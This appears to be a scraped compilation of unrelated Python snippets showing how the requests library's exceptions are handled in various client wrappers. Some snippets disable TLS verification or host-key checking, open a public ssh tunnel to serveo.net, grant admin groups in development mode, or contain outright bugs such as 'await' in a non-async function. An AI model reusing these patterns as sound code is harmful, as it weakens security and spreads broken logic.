        print_error("HTTP error occurred")
        sys.exit(-3)
    except requests.Timeout:
        print_error("Request timed out")
        sys.exit(-4)
    except:
        print_error("An unexpected error " + sys.exc_info()[0] + " occurred")
        sys.exit(-5)

    return r


# API DELETE. 
**************************************
def __request_requests(self, url, method, data=None):
        out = self.empty_json
        if isinstance(data, dict):
            data = json.dumps(data)
        elif data:
            try:
                data = json.loads(data)
            except ValueError:
                print "Input not a valid JSON document"
                return 400, "Input not a valid JSON document", out
        try:
            if method == 'GET':
                return _get_requests(url, headers=self.headers,
                                     auth=(self.username, self.password),
                                     timeout=self.timeout)
            elif method == 'PUSH':
                return _post_requests(url, data=data, headers=self.headers,
                                      auth=(self.username, self.password),
                                      timeout=self.timeout)
            elif method == 'DELETE':
                r = requests.delete(url, headers=self.headers,
                                    auth=(self.username, self.password),
                                    timeout=self.timeout)
            elif method == 'PUT':
                r = requests.put(url, data=data, headers=self.headers,
                                 auth=(self.username, self.password),
                                 timeout=self.timeout)
            elif method == 'PATCH':
                r = requests.patch(url, data=data, headers=self.headers,
                                   auth=(self.username, self.password),
                                   timeout=self.timeout)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ProxyError as e:
            print "ProxyError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ProxyError for url %s: %s" % (url,e,), out
        except requests.SSLError as e:
            print "SSLError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "SSLError for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        return r.status_code, "OK", r.json() 
**************************************
def push_data(self):
        # Prepare data to Power BI dashboard
        show_boxes = self.scores > self.min_threshold
        count = len(show_boxes[show_boxes])
        #print('Number of fish: ' + str(count))
        
        # Format data to send as JSON
        now = datetime.strftime(datetime.now(), "%Y-%m-%dT%H:%M:%S%Z")
        if count == 0:
            score_avg = 0
            score_std = 0
            score_median = 0
            score_min = 0
            score_max = 0
        else:
            score_avg = np.mean(self.scores[self.scores > self.min_threshold])
            score_std = np.std(self.scores[self.scores > self.min_threshold])
            score_median = np.median(self.scores[self.scores > self.min_threshold])
            score_min = np.min(self.scores[self.scores > self.min_threshold])
            score_max = np.max(self.scores[self.scores > self.min_threshold])
            
        data = '[{{ "timestamp": "{0}", "count": "{1:d}", "score_avg": "{2:0.5f}", "score_std": "{3:0.5f}", "score_median": "{4:0.5f}", "score_min": "{5:0.5f}", "score_max": "{6:0.5f}", "min_threshold": "{7:0.5f}" }}]'.format(now, count, score_avg, score_std, score_median, score_min, score_max, self.min_threshold)

        # Send the data to the Power BI dashboard
        binary_data = data.encode('utf8')
        
        # Limit the amount of times data can be pushed per second
        max_pushes_per_second = 4
        time_seconds = time.time() % 60
        remainder = (time_seconds - np.floor(time_seconds)) % (1/max_pushes_per_second)

        # Reset count limit every second (leave some jitter room)
        jitter = 0.1
        global push_count
        if (time_seconds - np.floor(time_seconds)) < jitter*2:
          push_count = 0
        
        # If within jitter (0.1 seconds) of the timepoints where we can send data (if max_pushes_per_second = 4, then we can push at 0.25, 0.5, 0.75, and at 0)
        if (remainder <= jitter) or (abs(remainder - (1/max_pushes_per_second)) <= jitter):
          push_count += 1
          if push_count <= max_pushes_per_second:
            try:
              response = requests.post(REST_API_URL, data=binary_data)
              #print(data)
              #print(push_count)
            except requests.ConnectionError as e:
              print('[ERROR] Connection Error')
              print(str(e))
        

# REST API endpoint, given to you when you create an API streaming dataset
# Follow the tutorial here https://docs.microsoft.com/en-us/power-bi/service-real-time-streaming
# Will be of the format: https://api.powerbi.com/beta/<tenant id>/datasets/< dataset id>/rows?key=<key id> 
**************************************
def serveo():
	global site, subdom
	flag = False

	print(G + '[+]' + C + ' Checking Serveo Status...', end='')

	try:
		time.sleep(1)
		rqst = requests.get('https://serveo.net', timeout=5)
		sc = rqst.status_code
		if sc == 200:
			print(C + '[' + G + ' UP ' + C + ']' + W + '\n')
		else:
			print(C + '[' + R + 'Status : {}'.format(sc) + C + ']' + W + '\n')
			exit()
	except requests.ConnectionError:
		print(C + '[' + R + ' DOWN ' + C + ']' + W + '\n')
		exit()
			
	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
	if subdom is None:
		with open('logs/serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	else:
		with open('logs/serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}.serveo.net:80:localhost:8080'.format(subdom), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	while True:
		
		time.sleep(2)
		with open('logs/serveo.txt', 'r') as tmpfile:
			try:
				stdout = tmpfile.readlines()
				if flag == False:
					for elem in stdout:
						if 'HTTP' in elem:
							elem = elem.split(' ')
							url = elem[4].strip()
							url = url + '/{}/'.format(site)
							print(G + '[+]' + C + ' URL : ' + W + url)
							flag = True
						else:
							pass
				elif flag == True:
					break
			except Exception as e:
				print(e)
				pass 

Python requests.exceptions() Examples

**************************************
def _must_post(self, api, data=None, json=None, timeout=10, **kwargs):
        if data is not None:
            kwargs['data'] = data
        elif json is not None:
            kwargs['json'] = json
        else:
            kwargs['data'] = {}
        kwargs['timeout'] = timeout

        try:
            r = requests.post(api, **kwargs)
            return r
        except requests.exceptions.Timeout:
            logger.error("Timeout requesting Gitter")
        except KeyboardInterrupt:
            raise
        except:
            logger.exception("Unknown error requesting Gitter")
        return None 
**************************************
def upload_image(self, filename=None, filedata=None, **kwargs) -> str:
        if filedata is None:
            files = {"image": open(filename, 'rb')}
        else:
            files = {"image": filedata}

        try:
            r = requests.post(self.url, files=files, timeout=5)
        except requests.exceptions.Timeout:
            logger.error("Timeout uploading to VimCN")
            return None
        except:
            logger.exception("Unknown errror uploading to VimCN")
            return None
        if not r.ok:
            return None
        return r.text.strip() 
**************************************
def http_head(self, path, **kwargs):
        """
        Make a HEAD request to the k8s server.
        """
        try:

            url = urljoin(self.url, path)
            response = self.session.head(url, **kwargs)
        except requests.exceptions.ConnectionError as err:
            # reraise as KubeException, but log stacktrace.
            message = "There was a problem retrieving headers from " \
                "the Kubernetes API server. URL: {}".format(url)
            logger.error(message)
            raise KubeException(message) from err

        return response 
**************************************
def http_post(self, path, data=None, json=None, **kwargs):
        """
        Make a POST request to the k8s server.
        """
        try:
            url = urljoin(self.url, path)
            response = self.session.post(url, data=data, json=json, **kwargs)
        except requests.exceptions.ConnectionError as err:
            # reraise as KubeException, but log stacktrace.
            message = "There was a problem posting data to " \
                      "the Kubernetes API server. URL: {}, " \
                      "data: {}, json: {}".format(url, data, json)
            logger.error(message)
            raise KubeException(message) from err

        return response 
**************************************
def http_put(self, path, data=None, **kwargs):
        """
        Make a PUT request to the k8s server.
        """
        try:
            url = urljoin(self.url, path)
            response = self.session.put(url, data=data, **kwargs)
        except requests.exceptions.ConnectionError as err:
            # reraise as KubeException, but log stacktrace.
            message = "There was a problem putting data to " \
                      "the Kubernetes API server. URL: {}, " \
                      "data: {}".format(url, data)
            logger.error(message)
            raise KubeException(message) from err

        return response 
**************************************
def _load_publisher_rules(self, rules_url):
        """
        Get the CIS integration rules
        """
        rules = None
        if not self.always_use_local_file:
            if rules_url is not None:
                try:
                    r = requests.get(rules_url)
                    rules = r.json()
                except (json.JSONDecodeError, requests.exceptions.ConnectionError) as e:
                    logger.debug("Failed to load rules data from rules_url {} ({})".format(rules_url, e))
        # Fall-back to built-in copy
        if self.always_use_local_file or rules is None:
            rules_file = "data/well-known/mozilla-iam-publisher-rules"
            if not os.path.isfile(rules_file):
                dirname = os.path.dirname(os.path.realpath(__file__))
                path = dirname + "/" + rules_file
            else:
                path = rules_file

            rules = json.load(open(path))
        return rules 
**************************************
def get_sso_groups(token):
    try:
        verify_cert = True
        if is_development_environment():
            verify_cert = False

        headers = {"Authorization": "Bearer " + token}
        r = requests.get(
            current_app.config["AUTH_SERVER_ADDRESS"],
            headers=headers,
            timeout=1,
            verify=verify_cert
        )
    except requests.exceptions.ReadTimeout:
        return None
    if r.status_code != 200 or "id" not in r.json():
        return None

    result = r.json()
    if is_development_environment():
        result["groups"] = [ADH6_USER, ADH6_ADMIN]  # If we are testing, consider the user asg.admin
    return result 
**************************************
def __init__(self, host, user=None, passwd=None, debug=False, use_ssl=True, verify_ssl=False, timeout=300,
                 disable_request_warnings=False, apikey=None):
        super(FortiGate, self).__init__()
        self._host = host
        self._user = user
        self._req_id = 0
        self._url = None
        self._session = None
        self._sid = None
        self._timeout = timeout
        self._debug = debug
        self._use_ssl = use_ssl
        self._verify_ssl = verify_ssl
        self._apikeyused = True if passwd is None and apikey is not None else False
        self._passwd = passwd if passwd is not None else apikey
        self._req_resp_object = RequestResponse()
        self._logger = None
        if disable_request_warnings:
            requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) 
**************************************
def _call(self, method, endpoint, payload=None):
        """
        Call the endpoint and return the response
        """
        resp = None
        shuffle(self.hosts)
        for index in xrange(len(self.hosts)):
            url = "http://%s/v1%s" % (self.hosts[index], endpoint)
            req_args = {'timeout': 10, 'headers': {'Content-Type': 'application/json'}}
            try:
                if method == _GET:
                    resp = requests.get(url, **req_args)
                elif method == _POST:
                    resp = requests.post(
                        url, data=payload, **req_args)
                elif method == _DELETE:
                    resp = requests.delete(url, **req_args)
                break
            except requests.exceptions.RequestException:
                continue
        if resp is None:
            raise DkronClientException("No valid host found")
        return resp 
**************************************
def __exit__(self, exc, value, traceback):
        if self._is_reported:
            # if the user has already manually marked this response as failure or success
            # we can ignore the default haviour of letting the response code determine the outcome
            return exc is None
        
        if exc:
            if isinstance(value, ResponseError):
                self.failure(value)
            else:
                return False
        else:
            try:
                self.raise_for_status()
            except requests.exceptions.RequestException as e:
                self.failure(e)
            else:
                self.success()
        return True 
**************************************
def execute(self):
		timeout = self.timeout_seconds
		if timeout is None: timeout = GLOBAL_TIMEOUT_SECONDS
		try:
			if timeout is None:
				r = urllib.request.urlopen(self.rq, **_get_tls_parms())
			else:
				r = urllib.request.urlopen(self.rq, None, timeout, **_get_tls_parms())
		except urllib.error.HTTPError as e:
			self.status_code = e.code
			self.text = e.msg
			return self
		except (http.client.HTTPException, urllib.error.URLError, socket.timeout) as e:
			e2 = exceptions.RequestException("{}.{!r}".format(type(e).__module__, e))
			raise e2
		self._rdata = r.read()
		if DEBUG: print("Response._rdata set to:", repr(self._rdata), file=sys.stderr)
		self.map_request(r)
		r.close()
		return self 
**************************************
def request(session, method, url, **kwargs):
    """
    :desc: Custom wrapper method to add a timeout message
           when there is a `requests.exceptions.ConnectionError`
           or `requests.ReadTimeout` exception.
    :param: `session` requests.Session object
            `method` HTTP method to use
            `url` name of the URL
    :return: requests.Response object.
    """

    try:
        return session.request(method=method, url=url, timeout=(5, 5), **kwargs)
    except (ConnectionError, ReadTimeout):
        print(INTERNET_DOWN_MSG)
        sys.exit(1) 
**************************************
def __init__(self, endpoint, resource_uri, optimization=True,
                 max_elems=100, filter_query=None, filter_dialect=None):
        self.endpoint = endpoint
        self.resource_uri = resource_uri
        self.filter_dialect = None
        self.filter_query = None
        self.optimization = optimization
        self.max_elems = max_elems

        if filter_query is not None:
            try:
                self.filter_dialect = FILTER_DIALECT_MAP[filter_dialect]
            except KeyError:
                valid_opts = ', '.join(FILTER_DIALECT_MAP)
                raise exceptions.WSManInvalidFilterDialect(
                    invalid_filter=filter_dialect, supported=valid_opts)

            self.filter_query = filter_query 
**************************************
def patch(self, restApi, data={}, silentMode=False):
        """
        Description
           A HTTP PATCH function to modify configurations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
        """

        if silentMode == False:
            print('\nPATCH:', restApi)
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)
        try:
            response = requests.patch(restApi, data=json.dumps(data), headers=self.jsonHeader)
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                print('\nPatch error:')
                raise IxNetRestApiException('http PATCH error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http PATCH error: {0}\n'.format(errMsg)) 
**************************************
def patch(self, restApi, data={}, silentMode=False):
        """
        Description
           A HTTP PATCH function to modify configurations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
        """

        if silentMode == False:
            print('\nPATCH:', restApi)
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)
        try:
            response = requests.patch(restApi, data=json.dumps(data), headers=self.jsonHeader)
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                print('\nPatch error:')
                raise IxNetRestApiException('http PATCH error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http PATCH error: {0}\n'.format(errMsg)) 
**************************************
def patch(self, restApi, data={}, silentMode=False):
        """
        Description
           A HTTP PATCH function to modify configurations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
        """

        if silentMode == False:
            print('\nPATCH:', restApi)
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)
        try:
            response = requests.patch(restApi, data=json.dumps(data), headers=self.jsonHeader)
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                print('\nPatch error:')
                raise IxNetRestApiException('http PATCH error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http PATCH error: {0}\n'.format(errMsg)) 
**************************************
def patch(self, restApi, data={}, silentMode=False):
        """
        Description
           A HTTP PATCH function to modify configurations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
        """

        if silentMode == False:
            print('\nPATCH:', restApi)
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)
        try:
            response = requests.patch(restApi, data=json.dumps(data), headers=self.jsonHeader)
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                print('\nPatch error:')
                raise IxNetRestApiException('http PATCH error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http PATCH error: {0}\n'.format(errMsg)) 
**************************************
def down(text):
    """<url> - checks if <url> is online or offline
    :type text: str
    """

    if "://" not in text:
        text = 'http://' + text

    text = 'http://' + urllib.parse.urlparse(text).netloc

    try:
        requests.get(text)
    except requests.exceptions.ConnectionError:
        return '{} seems to be down'.format(text)
    else:
        return '{} seems to be up'.format(text) 
**************************************
def register_operation_failure(self, v):
        self.incr_counter('operation.failure')
        return v

    #
    # The raw HTTP requests
    #

    # def _http_req(self, endpoint, **kwargs):
    #     url = 'http://%s:%d/%s' % (self.http_service_host, self.http_service_port, endpoint)
    #
    #     # self.log.msg("[HTTP] %s %r" % (url, kwargs), level=logger.INFO)
    #
    #     try:
    #         r = requests.post(url, **kwargs)
    #     except requests.exceptions.RequestException:
    #         self.log.msg("ERROR in HTTP request: %s" % get_traceback(), level=logger.INFO)
    #     else:
    #         if r.status_code != 200:
    #             self.log.msg("Bad status code in HTTP request: %d" % r.status_code, level=logger.INFO)
    #             return None
    #         else:
    #             return r 
**************************************
def _set_response_ins_(self, pageurl):
        """
        Sets the response for the GET request of pageurl and stores it in self.resp

        :param pageurl: url for which we store the response.
        """
        try:
            s = requests.Session()
            a = requests.adapters.HTTPAdapter(max_retries=5)
            s.mount('http://', a)
            resp = s.get(pageurl, timeout=30)
            self.__resp_obj__ = resp
            resp.close()
        except requests.exceptions.Timeout:
            logging.error("\tVery Slow Internet Connection.")
        except requests.exceptions.ConnectionError:
            logging.error("\tNetwork Unavailable. Check your connection.")
        except requests.exceptions.MissingSchema:
            logging.error("\t503 Service Unavailable. Retrying download ... ") 
**************************************
def wan_available(retry: int = 0):
    """

    Returns: True if connected to WAN

    """
    try:
        response = requests.get('http://google.com', timeout=2)
        commands.DCS.unblock_start('no WAN connection available')
        commands.DISCORD.can_start()
        return bool(response.ok)
    except requests.exceptions.RequestException:
        if retry < 5:
            LOGGER.debug('Internet connection loss detected, retry %s', retry)
            await asyncio.sleep(2)
            result = await wan_available(retry + 1)
            return result
        LOGGER.debug(f'Internet connection loss detected, no more retry')
        commands.DISCORD.cannot_start()
        commands.DCS.block_start('no WAN connection available')
        return False 
**************************************
def get_cdas_url(starttime, endtime, vars, dataset, timeout=10):
    dataview = 'sp_phys'
    if vars is None:
        try:
            var_info = get_variables(dataset, timeout=timeout)
        except requests.exceptions.ReadTimeout:
            raise util.NoDataError(
                'Connection to CDAweb timed out when getting CDAS URL for '
                f'{dataset} data for interval {starttime} - {endtime}.')

        if not len(var_info):
            raise util.NoDataError(
                f'No {dataset} data available for date {date}')

        vars = [v['Name'] for v in var_info['VariableDescription']]

    uri = '/'.join(['dataviews', dataview,
                    'datasets', dataset,
                    'data',
                    ','.join([starttime.strftime('%Y%m%dT%H%M%SZ'),
                              endtime.strftime('%Y%m%dT%H%M%SZ')]),
                    ','.join(vars)
                    ])
    url = '/'.join([CDAS_BASEURL, uri])
    return url 
**************************************
def test_full_internal_error_text(self, full_bot_setup):
        """Tests that unhandled exceptions in commands with error text are handled safely"""

        bot = full_bot_setup["bot"]
        aux_api = full_bot_setup["aux_api"]
        emulator = full_bot_setup["emulator"]

        @bot.command("exception")
        def cause_exception():
            raise ValueError("Whoops", "Hey, an exception")

        self.start_receiver(full_bot_setup["receiver_process"], full_bot_setup["receiver_webhook_url"])

        bot_reply = self.invoke_bot(aux_api, emulator.bot_id, emulator.bot_displayname, "exception", room_name="test1")

        assert bot_reply.text == "⚠️ Error: Hey, an exception" 
**************************************
def test_full_internal_error(self, full_bot_setup):
        """Tests that unhandled exceptions in commands without error text are handled safely"""

        bot = full_bot_setup["bot"]
        aux_api = full_bot_setup["aux_api"]
        emulator = full_bot_setup["emulator"]

        @bot.command("exception")
        def cause_exception():
            raise ValueError("Whoops")

        self.start_receiver(full_bot_setup["receiver_process"], full_bot_setup["receiver_webhook_url"])

        bot_reply = self.invoke_bot(aux_api, emulator.bot_id, emulator.bot_displayname, "exception", room_name="test1")

        assert bot_reply.text == "⚠️ Error: Something happened internally. For more information, contact the bot author." 
**************************************
def download(url, timeout=5):
    try:
        response = requests.get(url, timeout=timeout)
    except requests.exceptions.RequestException as ex:
        error(f"Exception caught while fetching {url}\n{ex}")
        return None

    if response.status_code != 200:
        error(f"Unexpected status code {response.status_code} while fetching {url}")
        return None

    return response 
**************************************
def new_paste(self, text, sender, **kwargs) -> str:

        ts = kwargs["date"] + kwargs["time"] \
            if "date" in kwargs and "time" in kwargs \
            else get_now().strftime("%Y%m%d%H%M")

        filename = "{sender}.{ts}.txt".format(
            sender=sender,
            ts=ts
        )
        data = {
            'api_option': "paste",
            'api_dev_key': self.api_dev_key,
            'api_paste_code': text,
            'api_paste_name': filename,
        }
        try:
            r = requests.post(self.api_url, data=data, timeout=5)
        except requests.exceptions.Timeout:
            logger.error("Timeout uploading to Pastebin")
            return None

        if r.text.startswith("http"):
            return r.text.strip()

        return None 
**************************************
def new_paste(self, text, sender, **kwargs) -> str:
        data = {
            'vimcn': text,
        }
        try:
            r = requests.post(self.api_url, data=data, timeout=5)
        except requests.exceptions.Timeout:
            logger.error("Timeout uploading to Vinergy")
            return None

        if r.text.startswith("http"):
            return r.text.strip()

        return None 
**************************************
def upload_image(self, filename=None, filedata=None, **kwargs):
        if filedata is None:
            with open(filename, 'rb') as f:
                b64img = b64encode(f.read())
        else:
            b64img = b64encode(filedata)

        headers = {"Authorization": "Client-ID %s" % self.client_id}
        try:
            r = requests.post(
                self.url,
                headers=headers,
                data={
                    'image': b64img,
                    'type': 'base64',
                },
                timeout=5,
            )
        except requests.exceptions.Timeout:
            logger.error("Timeout uploading to Imgur")
            return None
        except:
            logger.exception("Unknown errror uploading to Imgur")
            return None

        try:
            ret = json.loads(r.text)
        except:
            return None
        if ret.get('status', None) != 200 or ret.get('success', False) != True:
            logger.error(
                "Error: Imgur returned error, {}".format(ret.get('data', ''))
            )
            return None

        link = ret.get('data', {}).get('link', None)
        return link if link is None else re.sub(r'^http:', 'https:', link) 
**************************************
def __call__(self, url, method='GET', body=None, headers=None,
                 timeout=None, **kwargs):
        """Make an HTTP request using requests.

        Args:
            url (str): The URI to be requested.
            method (str): The HTTP method to use for the request. Defaults
                to 'GET'.
            body (bytes): The payload / body in HTTP request.
            headers (Mapping[str, str]): Request headers.
            timeout (Optional[int]): The number of seconds to wait for a
                response from the server. If not specified or if None, the
                requests default timeout will be used.
            kwargs: Additional arguments passed through to the underlying
                requests :meth:`~requests.Session.request` method.

        Returns:
            google.auth.transport.Response: The HTTP response.

        Raises:
            google.auth.exceptions.TransportError: If any exception occurred.
        """
        try:
            _LOGGER.debug('Making request: %s %s', method, url)
            response = self.session.request(
                method, url, data=body, headers=headers, timeout=timeout,
                **kwargs)
            return _Response(response)
        except requests.exceptions.RequestException as caught_exc:
            new_exc = exceptions.TransportError(caught_exc)
            six.raise_from(new_exc, caught_exc) 
**************************************
def http_get(self, path, params=None, **kwargs):
        """
        Make a GET request to the k8s server.
        """
        try:
            url = urljoin(self.url, path)
            response = self.session.get(url, params=params, **kwargs)
        except requests.exceptions.ConnectionError as err:
            # reraise as KubeException, but log stacktrace.
            message = "There was a problem retrieving data from " \
                      "the Kubernetes API server. URL: {}, params: {}".format(url, params)
            logger.error(message)
            raise KubeException(message) from err

        return response 
**************************************
def http_delete(self, path, **kwargs):
        """
        Make a DELETE request to the k8s server.
        """
        try:
            url = urljoin(self.url, path)
            response = self.session.delete(url, **kwargs)
        except requests.exceptions.ConnectionError as err:
            # reraise as KubeException, but log stacktrace.
            message = "There was a problem deleting data from " \
                      "the Kubernetes API server. URL: {}".format(url)
            logger.error(message)
            raise KubeException(message) from err

        return response 
**************************************
def full_get(self, url, params=None, **kwargs):
        kwargs['headers'] = self._set_headers(kwargs.get('headers'))
        try:
            return self.session().get(url, params=params, **kwargs)
        except getattr(requests.exceptions, 'RequestException') as inst:
            # Only log the message to avoid logging any sensitive info.
            self.module.fail_json(msg=inst.message) 
**************************************
def full_post(self, url, data=None, json=None, **kwargs):
        kwargs['headers'] = self._set_headers(kwargs.get('headers'))

        try:
            return self.session().post(url, data=data, json=json, **kwargs)
        except getattr(requests.exceptions, 'RequestException') as inst:
            self.module.fail_json(msg=inst.message) 
**************************************
def full_put(self, url, data=None, **kwargs):
        kwargs['headers'] = self._set_headers(kwargs.get('headers'))

        try:
            return self.session().put(url, data=data, **kwargs)
        except getattr(requests.exceptions, 'RequestException') as inst:
            self.module.fail_json(msg=inst.message) 
**************************************
def full_patch(self, url, data=None, **kwargs):
        kwargs['headers'] = self._set_headers(kwargs.get('headers'))

        try:
            return self.session().patch(url, data=data, **kwargs)
        except getattr(requests.exceptions, 'RequestException') as inst:
            self.module.fail_json(msg=inst.message) 
**************************************
def full_delete(self, url, **kwargs):
        kwargs['headers'] = self._set_headers(kwargs.get('headers'))

        try:
            return self.session().delete(url, **kwargs)
        except getattr(requests.exceptions, 'RequestException') as inst:
            self.module.fail_json(msg=inst.message) 
**************************************
def _load_well_known(self):
        """
        Gets the discovery url's data ("well-known")
        Return dict,None the well-known JSON data copy
        """
        # Memory cache
        if self._well_known_json is not None:
            return self._well_known_json

        if not self.always_use_local_file:
            try:
                r = requests.get(self.discovery_url)
                self._well_known_json = r.json()
            except (json.JSONDecodeError, requests.exceptions.ConnectionError) as e:
                logger.debug("Failed to fetch schema url from discovery {} ({})".format(self.discovery_url, e))
                logger.debug("Using builtin copy")

        if self._well_known_json is None or self.always_use_local_file:
            well_known_file = "data/well-known/mozilla-iam"  # Local fall-back
            if not os.path.isfile(well_known_file):
                dirname = os.path.dirname(os.path.realpath(__file__))
                path = dirname + "/" + well_known_file
            else:
                path = well_known_file
            self._well_known_json = json.load(open(path))

        return self._well_known_json 
**************************************
def _load_schema(self, schema_url, stype="data/profile.schema"):
        """
        Loads JSON Schema from an URL
        @schema_url: str,None the schema URL
        @stype: str, type of schema to load. This is also the name of the library builtin, local copy.
        Return dict JSON object which is the CIS Profile Schema
        """
        schema = None
        if not self.always_use_local_file:
            if schema_url is not None:
                try:
                    r = requests.get(schema_url)
                    schema = r.json()
                except (json.JSONDecodeError, requests.exceptions.ConnectionError) as e:
                    logger.debug("Failed to load schema from schema_url {} ({})".format(schema_url, e))

        # That did not work, fall-back to local, built-in copy
        if schema is None or self.always_use_local_file:
            # Builtin, hardcoded schema from library
            schema_file = stype
            if not os.path.isfile(schema_file):
                dirname = os.path.dirname(os.path.realpath(__file__))
                path = dirname + "/" + schema_file
            else:
                path = schema_file

            schema = json.load(open(path))
        return schema 
**************************************
def __init__(self):
        self.sess = CacheControl(requests.session(), heuristic=CustomHeuristic(days=30), cache=FileCache('.web_cache'))
        self.exceptions = requests.exceptions 
**************************************
def has_permissions(self):
        try:
            self.check_bulk_quota_usage()
        except requests.exceptions.HTTPError as err:
            if err.response is not None:
                for error_response_item in err.response.json():
                    if error_response_item.get('errorCode') == 'API_DISABLED_FOR_ORG':
                        return False
        return True 
**************************************
def _raise_for_status(self, response, explanation=None):
        """Raises stored :class:`APIError`, if one occurred."""
        try:
            response.raise_for_status()
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 404:
                raise errors.NotFound(e, response, explanation=explanation)
            raise errors.APIError(e, response, explanation=explanation) 
**************************************
def _do_request(self, payload):
        payload = payload.build()
        LOG.debug('Sending request to %(endpoint)s: %(payload)s',
                  {'endpoint': self.endpoint, 'payload': payload})
        try:
            resp = requests.post(
                self.endpoint,
                auth=requests.auth.HTTPBasicAuth(self.username, self.password),
                data=payload,
                # TODO(ifarkas): enable cert verification
                verify=False)

        except Exception as e:
            # This is a hack for handling 'No route to host' ConnectionError,
            # so that the Traceback would not be shown
            if e.__class__ == 'requests.exceptions.ConnectionError':
                LOG.exception('Request failed (ConnectionError)')
                raise exceptions.WSManRequestFailure()
            if e.__class__ == 'requests.exceptions.RequestException':
                LOG.exception('Request failed')
                raise exceptions.WSManRequestFailure()
            else:
                raise

        LOG.debug('Received response from %(endpoint)s: %(payload)s',
                  {'endpoint': self.endpoint, 'payload': resp.content})
        if not resp.ok:
            raise exceptions.WSManInvalidResponse(
                status_code=resp.status_code,
                reason=resp.reason)
        else:
            return resp 
**************************************
def invoke(self, resource_uri, method, selectors=None, properties=None,
               expected_return_value=None):
        """Invokes a remote WS-Man method

        :param resource_uri: URI of the resource
        :param method: name of the method to invoke
        :param selectors: dictionary of selectors
        :param properties: dictionary of properties
        :param expected_return_value: expected return value reported back by
            the DRAC card. For return value codes check the profile
            documentation of the resource used in the method call. If not set,
            return value checking is skipped.
        :returns: an lxml.etree.Element object of the response received
        :raises: WSManRequestFailure on request failures
        :raises: WSManInvalidResponse when receiving invalid response
        :raises: DRACOperationFailed on error reported back by the DRAC
                 interface
        :raises: DRACUnexpectedReturnValue on return value mismatch
        """
        if selectors is None:
            selectors = {}

        if properties is None:
            properties = {}

        resp = super(WSManClient, self).invoke(resource_uri, method, selectors,
                                               properties)

        return_value = utils.find_xml(resp, 'ReturnValue', resource_uri).text
        if return_value == utils.RET_ERROR:
            message_elems = utils.find_xml(resp, 'Message', resource_uri, True)
            messages = [message_elem.text for message_elem in message_elems]
            raise exceptions.DRACOperationFailed(drac_messages=messages)

        if (expected_return_value is not None and
                return_value != expected_return_value):
            raise exceptions.DRACUnexpectedReturnValue(
                expected_return_value=expected_return_value,
                actual_return_value=return_value)

        return resp 
**************************************
def block_until_number_of_known_nodes_is(self,
                                             number_of_nodes_to_know: int,
                                             timeout: int = 10,
                                             learn_on_this_thread: bool = False):
        start = maya.now()
        starting_round = self._learning_round

        while True:
            rounds_undertaken = self._learning_round - starting_round
            if len(self.__known_nodes) >= number_of_nodes_to_know:
                if rounds_undertaken:
                    self.log.info("Learned about enough nodes after {} rounds.".format(rounds_undertaken))
                return True

            if not self._learning_task.running:
                self.log.warn("Blocking to learn about nodes, but learning loop isn't running.")
            if learn_on_this_thread:
                try:
                    self.learn_from_teacher_node(eager=True)
                except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout):
                    # TODO: Even this "same thread" logic can be done off the main thread.
                    self.log.warn("Teacher was unreachable.  No good way to handle this on the main thread.")

            # The rest of the fucking owl
            if (maya.now() - start).seconds > timeout:
                if not self._learning_task.running:
                    raise RuntimeError("Learning loop is not running.  Start it with start_learning().")
                else:
                    raise self.NotEnoughNodes("After {} seconds and {} rounds, didn't find {} nodes".format(
                        timeout, rounds_undertaken, number_of_nodes_to_know))
            else:
                time.sleep(.1) 
**************************************
def _node_request_handler(self, request):
        """The callback function for processing service request.

        It never raises. If anything unexpected happens, it will return a PollyResponse with details of the exception.

        :param request: an instance of PollyRequest
        :return: a PollyResponse
